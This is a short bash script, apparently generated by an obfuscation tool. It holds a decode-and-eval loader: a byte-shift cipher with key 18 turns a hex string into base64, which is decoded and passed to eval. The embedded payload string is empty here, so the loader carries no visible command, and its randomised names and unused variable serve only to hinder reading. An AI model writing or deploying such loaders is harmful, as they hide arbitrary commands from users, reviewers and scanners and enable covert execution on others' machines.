#!/bin/bash
hmgk=18
optdmw=$(printf '%d' $((RANDOM % 256)))
tia0j8=""

ft7ue() {
    local _r=""
    local _len=${#tia0j8}
    for (( _i=0; _i<_len; _i+=2 )); do
        local _hex=${tia0j8:_i:2}
        local _dec=$((16#$_hex))
        local _b=$(((_dec - hmgk + 256) % 256))
        _r="$_r$(printf "\\$(printf '%03o' $_b)")"
    done
    echo "$_r"
}

gyxjir=$(echo "$(ft7ue)" | base64 -d)
eval "$gyxjir"
